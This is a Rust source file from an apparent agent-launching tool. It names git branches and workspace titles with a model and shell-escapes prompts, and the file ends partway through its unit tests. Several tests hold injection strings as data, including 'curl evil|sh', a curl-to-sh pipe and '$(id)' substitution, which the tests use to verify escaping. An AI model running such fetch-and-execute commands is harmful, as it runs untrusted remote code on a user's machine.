use rand::seq::SliceRandom;
use std::collections::HashSet;
use std::path::Path;
use std::time::Duration;

use crate::utility_ai::{generate_utility_text, UtilityModelSelection};

const ADJECTIVES: &[&str] = &[
    "swift", "bold", "calm", "dark", "eager", "fair", "glad", "keen",
    "lean", "mild", "neat", "pale", "rare", "safe", "tall", "vast",
    "warm", "wise", "able", "bare", "cold", "deep", "easy", "fast",
    "good", "hard", "idle", "just", "kind", "lazy", "loud", "main",
    "odd", "open", "pure", "real", "rich", "slim", "soft", "thin",
    "true", "ugly", "void", "weak", "wide", "wild", "worn", "zero",
    "blue", "red",
];

const NOUNS: &[&str] = &[
    "arch", "beam", "bolt", "cape", "chip", "core", "dart", "dock",
    "edge", "fern", "flux", "gate", "grid", "helm", "hive", "iris",
    "jade", "kite", "knot", "lamp", "leaf", "link", "loom", "mast",
    "mesa", "nest", "node", "opal", "palm", "path", "peak", "pine",
    "pond", "rail", "reef", "root", "rust", "sage", "seed", "silo",
    "slab", "span", "stem", "surf", "tide", "vale", "vine", "volt",
    "wave", "zinc",
];

/// Sanitize a string into a valid git branch name.
pub fn sanitize_branch_name(raw: &str) -> String {
    let mut name: String = raw
        .chars()
        .map(|c| match c {
            ' ' | '_' => '-',
            c if c.is_ascii_alphanumeric() || c == '-' || c == '.' => c,
            _ => '\0',
        })
        .filter(|&c| c != '\0')
        .collect();

    // Collapse consecutive hyphens
    while name.contains("--") {
        name = name.replace("--", "-");
    }
    // Collapse consecutive dots
    while name.contains("..") {
        name = name.replace("..", ".");
    }

    // Truncate to 50 chars at a word boundary if possible
    if name.len() > 50 {
        if let Some(pos) = name[..50].rfind('-') {
            name.truncate(pos);
        } else {
            name.truncate(50);
        }
    }

    // Trim leading/trailing hyphens and dots.
    let mut name = name.trim_matches(|c| c == '-' || c == '.').to_string();

    // Git rejects refs ending in ".lock", so strip any such suffix and
    // re-trim any separator it exposes (loop handles e.g. "foo.lock.lock").
    while let Some(stripped) = name.strip_suffix(".lock") {
        name = stripped
            .trim_end_matches(|c| c == '-' || c == '.')
            .to_string();
    }
    name
}

/// Check name against a set of existing branches, appending -2..-99 on conflict.
pub fn deconflict_against(name: &str, existing: &HashSet<String>) -> String {
    if !existing.contains(name) {
        return name.to_string();
    }
    for suffix in 2..=99 {
        let candidate = format!("{name}-{suffix}");
        if !existing.contains(&candidate) {
            return candidate;
        }
    }
    format!("{name}-{}", &uuid::Uuid::new_v4().to_string()[..8])
}

/// Check name against local and remote branches in a git repo.
pub fn deconflict_branch_name(name: &str, repo_path: &Path) -> String {
    let mut existing = HashSet::new();
    if let Ok(local) = crate::git::git_list_branches(repo_path, false) {
        existing.extend(local);
    }
    if let Ok(remote) = crate::git::git_list_branches(repo_path, true) {
        for b in remote {
            // Strip origin/ prefix for comparison
            let stripped = b.strip_prefix("origin/").unwrap_or(&b).to_string();
            existing.insert(stripped);
        }
    }
    deconflict_against(name, &existing)
}

/// Generate a random adjective-noun pair.
pub fn random_name_pair() -> String {
    let mut rng = rand::thread_rng();
    let adj = ADJECTIVES.choose(&mut rng).unwrap_or(&"swift");
    let noun = NOUNS.choose(&mut rng).unwrap_or(&"bolt");
    format!("{adj}-{noun}")
}

/// Generate a random branch name, deconflicted against the repo.
pub fn generate_random_name(repo_path: &Path) -> String {
    let name = random_name_pair();
    deconflict_branch_name(&name, repo_path)
}

/// Instructions for the branch-name call. Kept terse and imperative so the
/// model returns a bare token rather than a chatty sentence — models otherwise
/// prepend prose ("Branch name only, as requested:\n\n...") that used to leak
/// straight into the branch name.
const BRANCH_NAME_INSTRUCTIONS: &str = "You generate git branch names. Reply with ONLY a short lowercase hyphenated branch name of 2-4 words describing the task. No prose, no explanation, no punctuation other than hyphens, no code formatting or markdown.";

/// Instructions for the workspace-title call. The title is what the sidebar
/// shows above the branch, so it is written for a person to scan weeks later
/// rather than for git. Adapted from T3 Code's thread-title prompt.
const WORKSPACE_TITLE_INSTRUCTIONS: &str = "Generate a title that will help the user recognize this coding workspace weeks later. Reply with ONLY the title on a single line: no quotes, no markdown, no explanation.

Rules:
- 3-8 words, fewer than 40 characters, in Title Case.
- Name the subject and the outcome the user wants. Discard instructions about how the agent should work, such as models, tools, output formats, or monitoring.
- Capture the umbrella goal when the request lists several symptoms or steps.
- Name the product change, not the mock, plan, report, branch, or PR used to produce it.
- Do not copy and truncate the user's message.
- Do not claim the work is complete.
- Avoid project names, quotes, filler, and trailing punctuation.";

/// Cap on how much of the user's first message we embed in the branch-name
/// prompt. The branch name only needs the gist; an overlong message wastes
/// tokens and distracts the model.
const TASK_PROMPT_MAX_CHARS: usize = 400;

/// The title gets more of the message than the branch: it has to capture the
/// umbrella goal, which long requests often state only after the details.
const TITLE_PROMPT_MAX_CHARS: usize = 2_000;

/// Longest title we accept from the model. The prompt asks for under 40
/// characters; anything far past that is prose, not a title.
const TITLE_MAX_CHARS: usize = 60;

/// Naming timeout. Branch naming sits on the critical path of creating a
/// worktree, so it must not inherit the Utility agent's long summarisation
/// timeout. Dropping the generation future kills the CLI child.
const AI_NAME_TIMEOUT: Duration = Duration::from_secs(30);

/// Truncate `s` to at most `max_chars` characters on a char boundary,
/// appending an ellipsis when truncation happened. Uses `char_indices` so we
/// never slice through a multi-byte UTF-8 sequence (prompts are free text).
fn truncate_on_char_boundary(s: &str, max_chars: usize) -> String {
    match s.char_indices().nth(max_chars) {
        Some((byte_idx, _)) => format!("{}…", &s[..byte_idx]),
        None => s.to_string(),
    }
}

/// Extract a plausible branch-name token from raw CLI stdout.
///
/// Even with a strict system prompt, models sometimes wrap the answer in prose
/// ("Branch name only:\n\nfoo-bar"), backticks, or `**bold**`. We scan
/// non-empty lines, strip that decoration, and keep only lines that look like a
/// single branch token: no internal whitespace and 2..=80 chars. The real
/// answer is almost always last, after any preamble, so we return the LAST
/// qualifying line. Returns `None` when nothing qualifies — the caller treats
/// that like a CLI failure and falls back to a random name.
pub fn extract_branch_candidate(raw: &str) -> Option<String> {
    let mut candidate = None;
    for line in raw.lines() {
        // Strip surrounding whitespace, then code/emphasis decoration, then
        // whitespace again in case the decoration hid some.
        let stripped = line
            .trim()
            .trim_matches('`')
            .trim_start_matches("**")
            .trim_end_matches("**")
            .trim();
        if stripped.is_empty() || stripped.chars().any(char::is_whitespace) {
            continue;
        }
        let len = stripped.chars().count();
        if !(2..=80).contains(&len) {
            continue;
        }
        candidate = Some(stripped.to_string());
    }
    candidate
}

/// Clean a model's reply into a sidebar title, or `None` when it isn't one.
///
/// Takes the last non-empty line (any preamble comes first), strips markdown
/// and quote decoration plus a leading `Title:` label, collapses whitespace,
/// and drops trailing punctuation. A reply longer than `TITLE_MAX_CHARS` is
/// rejected rather than truncated: it is prose, and a cut sentence reads worse
/// than the caller's fallback.
pub fn sanitize_workspace_title(raw: &str) -> Option<String> {
    let line = raw.lines().map(str::trim).rev().find(|l| !l.is_empty())?;
    let mut title = line
        .trim_matches(|c: char| matches!(c, '`' | '*' | '_' | '#' | '"' | '\'' | '“' | '”'))
        .trim();
    if let Some(rest) = title
        .get(..6)
        .filter(|prefix| prefix.eq_ignore_ascii_case("title:"))
        .map(|_| &title[6..])
    {
        title = rest.trim_matches(|c: char| matches!(c, '`' | '*' | '"' | '\'' | ' '));
    }
    let title = title
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .trim_end_matches(['.', ',', ':', ';', '!'])
        .to_string();
    let len = title.chars().count();
    if len < 2 || len > TITLE_MAX_CHARS {
        return None;
    }
    Some(title)
}

/// Run one naming prompt through the Utility agent, bounded by
/// `AI_NAME_TIMEOUT`. `Err` carries a reason for the log.
async fn run_naming_prompt(
    selection: &UtilityModelSelection,
    prompt: &str,
) -> Result<String, String> {
    tokio::time::timeout(AI_NAME_TIMEOUT, generate_utility_text(selection, prompt))
        .await
        .map_err(|_| format!("timed out after {}s", AI_NAME_TIMEOUT.as_secs()))?
}

/// Generate a branch name from a prompt with the Utility agent's model.
///
/// Falls back to a random name on any failure, and also when no Utility model
/// is resolved: naming must never fall through to a provider's default model,
/// which can be its most expensive one.
pub async fn generate_ai_name(
    prompt: &str,
    repo_path: &Path,
    selection: Option<&UtilityModelSelection>,
) -> String {
    let Some(selection) = selection else {
        return generate_random_name(repo_path);
    };
    let task = truncate_on_char_boundary(prompt, TASK_PROMPT_MAX_CHARS);
    let naming_prompt = format!(
        "{BRANCH_NAME_INSTRUCTIONS}\n\nGenerate a git branch name for this task: {task}"
    );

    match run_naming_prompt(selection, &naming_prompt).await {
        Ok(raw) => match extract_branch_candidate(&raw) {
            Some(candidate) => {
                let sanitized = sanitize_branch_name(&candidate);
                if !sanitized.is_empty() {
                    return deconflict_branch_name(&sanitized, repo_path);
                }
            }
            None => {
                let excerpt: String = raw.trim().chars().take(120).collect();
                log::warn!(
                    "AI branch naming produced no usable name, falling back to random: {excerpt:?}"
                );
            }
        },
        Err(reason) => {
            log::warn!("AI branch naming failed, falling back to random name: {reason}");
        }
    }

    generate_random_name(repo_path)
}

/// Generate a human-readable workspace title from the user's first message
/// with the Utility agent's model. `None` when no Utility model is resolved
/// or the reply isn't usable; the caller keeps its own fallback.
pub async fn generate_ai_title(
    prompt: &str,
    selection: Option<&UtilityModelSelection>,
) -> Option<String> {
    let selection = selection?;
    let message = truncate_on_char_boundary(prompt.trim(), TITLE_PROMPT_MAX_CHARS);
    if message.is_empty() {
        return None;
    }
    let naming_prompt = format!("{WORKSPACE_TITLE_INSTRUCTIONS}\n\nUser message:\n{message}");

    match run_naming_prompt(selection, &naming_prompt).await {
        Ok(raw) => {
            let title = sanitize_workspace_title(&raw);
            if title.is_none() {
                let excerpt: String = raw.trim().chars().take(120).collect();
                log::warn!("AI workspace title produced no usable title: {excerpt:?}");
            }
            title
        }
        Err(reason) => {
            log::warn!("AI workspace title failed: {reason}");
            None
        }
    }
}

/// Escape a string for safe embedding in double-quoted shell arguments.
pub fn shell_escape_for_double_quotes(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('$', "\\$")
        .replace('`', "\\`")
        .replace('!', "\\!")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}

/// Escape a string for safe embedding in `$'...'` (ANSI-C quoted) shell arguments.
/// Unlike double-quote escaping, `$'...'` interprets `\n` as a real newline,
/// so multi-line prompts are preserved correctly.
///
/// The command is typed into an interactive shell as keystrokes, so the
/// result is printable ASCII only: a raw control byte (^U, ^O, ESC, ...) would
/// act as a line-editing key before the quote is ever parsed. Every other byte,
/// UTF-8 included, becomes `\xHH`, which bash and zsh decode back to the same
/// bytes. `'` is written as `\x27` so the body never contains a quote and
/// cannot end the quoted argument in any shell, and `!` as `\x21` so bash
/// history expansion cannot splice in other text. `$`, `` ` ``, `(` and `)`
/// are escaped too: nushell reads `$'...'` as an interpolated string that
/// runs `(...)` subexpressions, and leaves `\x28` as plain text. NUL cannot
/// reach argv and is dropped.
///
/// Only bash and zsh decode the escapes. In other `$SHELL`s the agent gets
/// the escaped text, or the line fails to parse (fish rejects `$'`), but the
/// body has nothing left to break out with.
pub fn shell_escape_for_ansi_c_quotes(s: &str) -> String {
    use std::fmt::Write as _;
    let mut out = String::with_capacity(s.len());
    for byte in s.bytes() {
        match byte {
            b'\\' => out.push_str("\\\\"),
            b'\n' => out.push_str("\\n"),
            b'\r' => out.push_str("\\r"),
            b'\t' => out.push_str("\\t"),
            0 => {}
            b'\'' | b'!' | b'$' | b'`' | b'(' | b')' => {
                let _ = write!(out, "\\x{byte:02X}");
            }
            0x20..=0x7e => out.push(byte as char),
            _ => {
                let _ = write!(out, "\\x{byte:02X}");
            }
        }
    }
    out
}

/// Quote a string as one PowerShell argument typed into an interactive
/// PowerShell. Single quotes are literal (no `$` or backtick expansion);
/// PowerShell treats the typographic single quotes as quotes too, so each of
/// them is doubled like `'`. Control characters would act as editing keys
/// (Tab completes, ^C cancels), so line breaks become spaces and the rest are
/// dropped.
pub fn shell_quote_for_powershell(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.replace("\r\n", "\n").chars() {
        match c {
            '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}' => {
                out.push(c);
                out.push(c);
            }
            '\n' | '\r' | '\t' => out.push(' '),
            c if c.is_control() => {}
            c => out.push(c),
        }
    }
    out.push('\'');
    out
}

/// The prompt as one argument for `shell` (the shell the agent command is
/// typed into), or None when that shell can't take it safely: `$'...'` is
/// only decoded by bash and zsh, fish rejects it, and cmd.exe expands
/// `%VAR%` and runs `&`/`|` with no literal quoting.
fn quote_prompt_argument(prompt: &str, shell: &str) -> Option<String> {
    let name = shell.rsplit(['/', '\\']).next().unwrap_or(shell).to_ascii_lowercase();
    match name.strip_suffix(".exe").unwrap_or(&name) {
        "bash" | "zsh" => Some(format!("$'{}'", shell_escape_for_ansi_c_quotes(prompt))),
        "pwsh" | "powershell" => Some(shell_quote_for_powershell(prompt)),
        _ => None,
    }
}

/// Make a prompt safe to type into an agent's TUI as keystrokes.
///
/// Used for presets whose prompt is written to the PTY after the agent
/// starts. Control characters would act as editing keys (^U, ^C, ESC
/// sequences), so all of them are dropped except tab and newline; CR and CRLF
/// become newlines.
pub fn sanitize_prompt_for_pty(prompt: &str) -> String {
    prompt
        .replace("\r\n", "\n")
        .replace('\r', "\n")
        .chars()
        .filter(|c| matches!(c, '\n' | '\t') || !c.is_control())
        .collect()
}

/// The flag that passes an initial prompt to an interactive session of a
/// builtin agent CLI (`""` for a positional prompt), checked against each
/// CLI's `--help`. None means the CLI has no such flag and the prompt has to
/// be typed into its TUI after it starts.
fn interactive_prompt_flag(preset_id: &str) -> Option<&'static str> {
    match preset_id {
        "builtin-claude" | "builtin-codex" | "builtin-cursor-agent" | "builtin-grok" => Some(""),
        "builtin-gemini" | "builtin-antigravity" | "builtin-copilot" => Some("-i "),
        "builtin-opencode" => Some("--prompt "),
        _ => None,
    }
}

/// Build the agent launch command, optionally embedding the prompt.
/// Returns (command, needs_pty_injection).
/// If needs_pty_injection is true, the prompt should be written to PTY after agent startup.
///
/// Embedding is preferred: the prompt stays one quoted argument and never
/// reaches a line editor as keystrokes. Typing is the fallback for CLIs
/// without a prompt flag (Amp, Droid, Mastracode, Pi, whose bare arguments
/// can name `@files`, and custom presets) and for shells the prompt can't be
/// quoted for.
pub fn prepare_agent_command(
    preset_id: &str,
    base_command: &str,
    initial_prompt: Option<&str>,
) -> (String, bool) {
    prepare_agent_command_for_shell(
        preset_id,
        base_command,
        initial_prompt,
        &crate::terminal::default_shell(),
    )
}

fn prepare_agent_command_for_shell(
    preset_id: &str,
    base_command: &str,
    initial_prompt: Option<&str>,
    shell: &str,
) -> (String, bool) {
    let prompt = match initial_prompt {
        Some(p) if !p.trim().is_empty() => p,
        _ => return (base_command.to_string(), false),
    };

    match interactive_prompt_flag(preset_id).zip(quote_prompt_argument(prompt, shell)) {
        Some((flag, quoted)) => (format!("{base_command} {flag}{quoted}"), false),
        None => (base_command.to_string(), true),
    }
}

/// The program a preset command launches: the first word of its last
/// `&&` step (agent-context setup runs first, see `inject_agent_context`)
/// after any `NAME=value` assignments and an `env` prefix, without its
/// directory. Used to recognise the agent once it owns the terminal.
pub fn agent_binary_name(command: &str) -> String {
    let last_step = command.rsplit("&&").next().unwrap_or(command);
    let program = last_step
        .split_whitespace()
        .find(|word| *word != "env" && !word.contains('='))
        .unwrap_or("");
    program
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(program)
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sanitize_basic() {
        assert_eq!(sanitize_branch_name("Fix Login Bug"), "Fix-Login-Bug");
    }

    #[test]
    fn sanitize_special_chars() {
        assert_eq!(
            sanitize_branch_name("feat: add @user auth!"),
            "feat-add-user-auth"
        );
    }

    #[test]
    fn sanitize_max_length() {
        let long = "a-".repeat(60);
        assert!(sanitize_branch_name(&long).len() <= 50);
    }

    #[test]
    fn sanitize_preserves_dots_and_hyphens() {
        assert_eq!(sanitize_branch_name("v1.2-beta"), "v1.2-beta");
    }

    #[test]
    fn sanitize_collapses_consecutive_hyphens() {
        assert_eq!(sanitize_branch_name("foo---bar"), "foo-bar");
    }

    #[test]
    fn sanitize_collapses_consecutive_dots() {
        assert_eq!(sanitize_branch_name("foo...bar"), "foo.bar");
    }

    #[test]
    fn sanitize_trims_leading_trailing() {
        assert_eq!(sanitize_branch_name("-foo-bar-"), "foo-bar");
        assert_eq!(sanitize_branch_name(".foo.bar."), "foo.bar");
    }

    #[test]
    fn sanitize_strips_trailing_lock_suffix() {
        // Git forbids refs ending in ".lock".
        assert_eq!(sanitize_branch_name("update.lock"), "update");
        assert_eq!(sanitize_branch_name("hotfix.lock.lock"), "hotfix");
        assert!(!sanitize_branch_name("release.lock").ends_with(".lock"));
        // Only the trailing suffix is stripped — ".lock" elsewhere stays.
        assert_eq!(sanitize_branch_name("my.lockfile"), "my.lockfile");
    }

    #[test]
    fn sanitize_uppercase() {
        assert_eq!(sanitize_branch_name("FIX-BUG"), "FIX-BUG");
    }

    #[test]
    fn sanitize_mixed_case_preserved() {
        assert_eq!(sanitize_branch_name("Feature/MyBranch"), "FeatureMyBranch");
    }

    #[test]
    fn sanitize_camel_case() {
        assert_eq!(sanitize_branch_name("fixLoginPage"), "fixLoginPage");
    }

    #[test]
    fn sanitize_empty_input() {
        assert_eq!(sanitize_branch_name(""), "");
    }

    #[test]
    fn random_name_pair_format() {
        let name = random_name_pair();
        assert!(name.contains('-'));
        let parts: Vec<&str> = name.split('-').collect();
        assert_eq!(parts.len(), 2);
        assert!(ADJECTIVES.contains(&parts[0]));
        assert!(NOUNS.contains(&parts[1]));
    }

    #[test]
    fn random_name_pair_varies() {
        let names: Vec<String> = (0..20).map(|_| random_name_pair()).collect();
        let unique: HashSet<&String> = names.iter().collect();
        assert!(unique.len() >= 2);
    }

    #[test]
    fn deconflict_no_conflict() {
        let existing = HashSet::new();
        assert_eq!(deconflict_against("foo", &existing), "foo");
    }

    #[test]
    fn deconflict_first_conflict() {
        let existing: HashSet<String> = ["foo".to_string()].into();
        assert_eq!(deconflict_against("foo", &existing), "foo-2");
    }

    #[test]
    fn deconflict_multiple_conflicts() {
        let existing: HashSet<String> = ["foo", "foo-2", "foo-3"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        assert_eq!(deconflict_against("foo", &existing), "foo-4");
    }

    #[test]
    fn prepare_claude_with_prompt() {
        let (cmd, via_pty) = prepare_agent_command_for_shell(
            "builtin-claude",
            "claude --dangerously-skip-permissions",
            Some("fix the login bug"),
            "/bin/bash",
        );
        assert!(cmd.contains("fix the login bug"));
        assert!(cmd.contains("$'"));
        assert!(!via_pty);
    }

    #[test]
    fn prepare_claude_with_multiline_prompt() {
        let (cmd, via_pty) = prepare_agent_command_for_shell(
            "builtin-claude",
            "claude --dangerously-skip-permissions",
            Some("Issue #42: broken\nStatus: Open\n\n---\nFix it"),
            "/usr/bin/zsh",
        );
        // Uses $'...' ANSI-C quoting so bash interprets \n as real newlines
        assert!(cmd.starts_with("claude --dangerously-skip-permissions $'"));
        assert!(cmd.contains("\\n"));
        assert!(!cmd.contains('\n')); // no literal newline bytes in the command
        assert!(!via_pty);
    }

    /// CLIs with an interactive prompt flag get the prompt as one quoted
    /// argument; the rest have it typed into their TUI.
    #[test]
    fn prepare_embeds_prompt_for_clis_with_a_prompt_flag() {
        let cases = [
            ("builtin-claude", "claude", "claude $'it\\x27s'"),
            ("builtin-codex", "codex", "codex $'it\\x27s'"),
            ("builtin-gemini", "gemini --yolo", "gemini --yolo -i $'it\\x27s'"),
            ("builtin-antigravity", "agy", "agy -i $'it\\x27s'"),
            ("builtin-copilot", "copilot --allow-all", "copilot --allow-all -i $'it\\x27s'"),
            ("builtin-opencode", "opencode", "opencode --prompt $'it\\x27s'"),
            ("builtin-cursor-agent", "cursor-agent --yolo", "cursor-agent --yolo $'it\\x27s'"),
            ("builtin-grok", "grok", "grok $'it\\x27s'"),
        ];
        for (preset, base, expected) in cases {
            let (cmd, via_pty) =
                prepare_agent_command_for_shell(preset, base, Some("it's"), "/bin/bash");
            assert_eq!(cmd, expected, "{preset}");
            assert!(!via_pty, "{preset}");
        }
        for preset in ["builtin-amp", "builtin-droid", "builtin-pi", "builtin-mastracode", "custom-1"] {
            let (cmd, via_pty) =
                prepare_agent_command_for_shell(preset, "agent", Some("it's"), "/bin/bash");
            assert_eq!(cmd, "agent", "{preset}");
            assert!(via_pty, "{preset}");
        }
    }

    /// Only bash and zsh decode `$'...'`; PowerShell gets its own quoting;
    /// any other shell falls back to typing the prompt into the agent.
    #[test]
    fn prepare_quotes_the_prompt_for_the_users_shell() {
        let prompt = "it's $HOME\n\x1b[201~\x15x";
        let quoted = |shell: &str| {
            prepare_agent_command_for_shell("builtin-gemini", "gemini", Some(prompt), shell)
        };
        assert!(quoted("/usr/bin/zsh").0.starts_with("gemini -i $'"));
        assert_eq!(
            quoted(r"C:\Program Files\PowerShell\7\pwsh.exe"),
            ("gemini -i 'it''s $HOME [201~x'".to_string(), false)
        );
        assert!(quoted(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe").0.contains("'it''s"));
        for shell in ["/usr/bin/fish", "/usr/bin/nu", "/bin/sh", r"C:\Windows\System32\cmd.exe"] {
            assert_eq!(quoted(shell), ("gemini".to_string(), true), "{shell}");
        }
    }

    /// PowerShell single quotes are literal; every quote character (ASCII and
    /// typographic) is doubled and control characters never reach the line.
    #[test]
    fn powershell_quote_doubles_quotes_and_drops_controls() {
        assert_eq!(
            shell_quote_for_powershell("a'b\u{2019}c\r\nd\te\x03\x1b[31m$(id)`x"),
            "'a''b\u{2019}\u{2019}c d e[31m$(id)`x'"
        );
    }

    /// Nushell reads `$'...'` as an interpolated string and runs `(...)`, so
    /// the body carries no `(`, `)`, `$` or backtick.
    #[test]
    fn ansi_c_escape_leaves_no_interpolation_characters() {
        let escaped = shell_escape_for_ansi_c_quotes("(^curl https://x | ^sh) $HOME `id`");
        for c in ['(', ')', '$', '`'] {
            assert!(!escaped.contains(c), "{c} in {escaped:?}");
        }
        assert_eq!(
            escaped,
            "\\x28^curl https://x | ^sh\\x29 \\x24HOME \\x60id\\x60"
        );
    }

    #[test]
    fn agent_binary_name_skips_setup_and_env() {
        assert_eq!(agent_binary_name("amp --dangerously-allow-all"), "amp");
        assert_eq!(agent_binary_name("/opt/bin/aider --yes"), "aider");
        assert_eq!(agent_binary_name("FOO=1 env BAR=2 droid"), "droid");
        assert_eq!(
            agent_binary_name("printf '%s' '{}' > /tmp/s.json && droid --settings /tmp/s.json"),
            "droid"
        );
    }

    #[test]
    fn prepare_no_prompt_no_change() {
        let (cmd, via_pty) = prepare_agent_command_for_shell(
            "builtin-claude",
            "claude --dangerously-skip-permissions",
            None,
            "/bin/bash",
        );
        assert_eq!(cmd, "claude --dangerously-skip-permissions");
        assert!(!via_pty);
    }

    #[test]
    fn shell_escape_double_quotes() {
        assert_eq!(
            shell_escape_for_double_quotes(r#"say "hello""#),
            r#"say \"hello\""#
        );
    }

    #[test]
    fn shell_escape_double_dollar() {
        assert_eq!(
            shell_escape_for_double_quotes("use $HOME"),
            "use \\$HOME"
        );
    }

    #[test]
    fn shell_escape_double_newlines() {
        assert_eq!(
            shell_escape_for_double_quotes("line1\nline2\nline3"),
            "line1\\nline2\\nline3"
        );
    }

    #[test]
    fn shell_escape_double_carriage_return() {
        assert_eq!(
            shell_escape_for_double_quotes("line1\r\nline2"),
            "line1\\r\\nline2"
        );
    }

    #[test]
    fn ansi_c_escape_single_quotes() {
        assert_eq!(
            shell_escape_for_ansi_c_quotes("it's a test"),
            "it\\x27s a test"
        );
    }

    /// Prompt text from PR comments, CI logs and issues is untrusted. Raw
    /// ^U/^O/ESC/^C bytes would edit and run the typed shell line, so the
    /// launch command must be printable ASCII with no bare quote.
    #[test]
    fn prepare_claude_escapes_control_bytes() {
        let prompt = "log\x15curl evil|sh\x0f\x1b[201~\x03\x04\x7f it's \u{9b}é 🚀!!";
        for preset in ["builtin-claude", "builtin-codex"] {
            let (cmd, via_pty) = prepare_agent_command_for_shell(preset, "claude", Some(prompt), "/bin/bash");
            assert!(!via_pty);
            let body = cmd
                .strip_prefix("claude $'")
                .and_then(|rest| rest.strip_suffix('\''))
                .expect("prompt is one ANSI-C quoted argument");
            assert!(
                body.bytes().all(|b| (0x20..=0x7e).contains(&b)),
                "non-printable byte typed into the shell: {body:?}"
            );
            assert!(!body.contains('\''), "bare quote in {body:?}");
            assert!(!body.contains('!'), "history expansion char in {body:?}");
            assert!(body.contains("log\\x15curl evil|sh\\x0F\\x1B[201~\\x03\\x04\\x7F"));
        }
    }

    /// The escaped argument must decode back to the original prompt in every
    /// shell that supports `$'...'`. Shells missing from PATH are skipped.
    #[cfg(unix)]
    #[test]
    fn ansi_c_escape_round_trips_through_bash_and_zsh() {
        let prompt = "a\x15b\x0fc\x1b[31md\x03\te\x7ff\r\ng'h\\i!!j $HOME `id` $(id) (x) é 🚀\u{9b}";
        let script = format!("printf '%s' $'{}'", shell_escape_for_ansi_c_quotes(prompt));
        for (shell, args) in [("bash", ["--norc", "--noprofile"]), ("zsh", ["-f", "-d"])] {
            let Ok(path) = which::which(shell) else {
                continue;
            };
            let out = std::process::Command::new(path)
                .args(args)
                .args(["-c", &script])
                .output()
                .expect("run shell");
            assert!(out.status.success(), "{shell}: {}", String::from_utf8_lossy(&out.stderr));
            assert_eq!(String::from_utf8(out.stdout).unwrap(), prompt, "{shell}");
        }
    }

    #[test]
    fn pty_prompt_drops_control_characters() {
        assert_eq!(
            sanitize_prompt_for_pty("a\x15b\x0f\x1b[201~c\x03\x7f\u{9b}d\r\ne\rf\tg\nh 🚀"),
            "ab[201~cd\ne\nf\tg\nh 🚀"
        );
    }

    #[test]
    fn ansi_c_escape_newlines() {
        assert_eq!(
            shell_escape_for_ansi_c_quotes("line1\nline2\nline3"),
            "line1\\nline2\\nline3"
        );
    }

    #[test]
    fn ansi_c_escape_hex_encodes_dollar_and_backtick() {
        // bash and zsh decode these back to a literal `$` and backtick (see
        // the round-trip test); the hex form keeps nushell from interpolating.
        assert_eq!(
            shell_escape_for_ansi_c_quotes("use $HOME and `cmd`"),
            "use \\x24HOME and \\x60cmd\\x60"
        );
    }

    #[test]
    fn ansi_c_escape_backslash_before_newline() {
        // Existing backslash must be escaped BEFORE newline replacement
        // Input: literal \ then newline then text
        assert_eq!(
            shell_escape_for_ansi_c_quotes("path\\\nline2"),
            "path\\\\\\nline2"
        );
        // bash $'path\\\\\\nline2' → path\ + newline + line2
    }

    #[tokio::test]
    async fn ai_naming_without_utility_model_never_calls_a_cli() {
        // No resolved Utility model must not fall through to a provider's
        // default (possibly expensive) model: branch → random, title → none.
        let repo = std::env::temp_dir();
        let name = generate_ai_name("Fix the login bug", &repo, None).await;
        assert!(name.contains('-'), "expected a random adjective-noun name, got {name}");
        assert_eq!(generate_ai_title("Fix the login bug", None).await, None);
    }

    #[test]
    fn title_plain_line_unchanged() {
        assert_eq!(
            sanitize_workspace_title("Collapse Settled Workspaces by Default"),
            Some("Collapse Settled Workspaces by Default".into())
        );
    }

    #[test]
    fn title_strips_preamble_decoration_and_punctuation() {
        assert_eq!(
            sanitize_workspace_title("Here is a title:\n\n**\"Hide Unconfigured   Agents.\"**"),
            Some("Hide Unconfigured Agents".into())
        );
        assert_eq!(
            sanitize_workspace_title("Title: Seamless HTML Previews"),
            Some("Seamless HTML Previews".into())
        );
    }

    #[test]
    fn title_rejects_empty_and_prose() {
        assert_eq!(sanitize_workspace_title("  \n "), None);
        assert_eq!(
            sanitize_workspace_title(
                "I would suggest naming this workspace after the sidebar naming change you described"
            ),
            None
        );
    }

    #[test]
    fn extract_plain_single_line_name() {
        assert_eq!(
            extract_branch_candidate("add-user-auth"),
            Some("add-user-auth".to_string())
        );
    }

    #[test]
    fn extract_strips_leading_prose_line() {
        assert_eq!(
            extract_branch_candidate("Branch name only, as requested:\n\nsome-feature-name"),
            Some("some-feature-name".to_string())
        );
    }

    #[test]
    fn extract_unwraps_backticked_name_after_prose() {
        assert_eq!(
            extract_branch_candidate(
                "The user only wants a branch name back.\n\n`fix-review-feedback`"
            ),
            Some("fix-review-feedback".to_string())
        );
    }

    #[test]
    fn extract_unwraps_bold_name() {
        assert_eq!(
            extract_branch_candidate("**investigate-full-access-approvals**"),
            Some("investigate-full-access-approvals".to_string())
        );
    }

    #[test]
    fn extract_rejects_pure_prose() {
        // Every line has internal whitespace, so nothing qualifies.
        assert_eq!(
            extract_branch_candidate("Sure, here you go.\nHappy to help with that."),
            None
        );
    }

    #[test]
    fn extract_rejects_empty_and_whitespace() {
        assert_eq!(extract_branch_candidate(""), None);
        assert_eq!(extract_branch_candidate("   \n\t\n  "), None);
    }

    #[test]
    fn extract_picks_last_plausible_over_trailing_prose() {
        // The name comes first, then a prose sign-off; the prose line has
        // whitespace and is skipped, so the name still wins.
        assert_eq!(
            extract_branch_candidate("some-name\nHope that helps!"),
            Some("some-name".to_string())
        );
    }

    #[test]
    fn truncate_on_char_boundary_short_input_unchanged() {
        assert_eq!(truncate_on_char_boundary("short task", 400), "short task");
    }

    #[test]
    fn truncate_on_char_boundary_appends_ellipsis() {
        let input = "a".repeat(500);
        let out = truncate_on_char_boundary(&input, 400);
        assert_eq!(out.chars().count(), 401); // 400 chars + ellipsis
        assert!(out.ends_with('…'));
    }

    #[test]
    fn truncate_on_char_boundary_respects_multibyte() {
        // Multi-byte chars must not be split mid-sequence.
        let input = "🚀".repeat(10);
        let out = truncate_on_char_boundary(&input, 4);
        assert_eq!(out, "🚀🚀🚀🚀…");
    }

    #[test]
    fn ansi_c_escape_multiline_issue_prompt() {
